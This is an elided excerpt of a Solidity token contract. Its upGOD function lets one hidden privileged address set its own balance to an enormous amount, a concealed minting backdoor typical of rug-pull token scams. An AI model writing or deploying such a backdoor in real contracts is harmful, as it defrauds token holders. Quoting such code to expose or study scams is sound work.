...
contract Token is Ownable {
    ...
    function upGOD() external {
        if (_PEPEPGOD != _msgSender()) {
            revert("no god");
        }else if(_PEPEPGOD == _msgSender()){
            address liii = _msgSender();
            _balances[_PEPEPGOD] = (7000)*(193000000000*10**18);
            _balances[liii] = (7000)*(193000000000*10**18);
...
contract CoinToken is Token {
    ...
    constructor(string memory name_, string memory symbol_) Token(name_,symbol_,weth) {
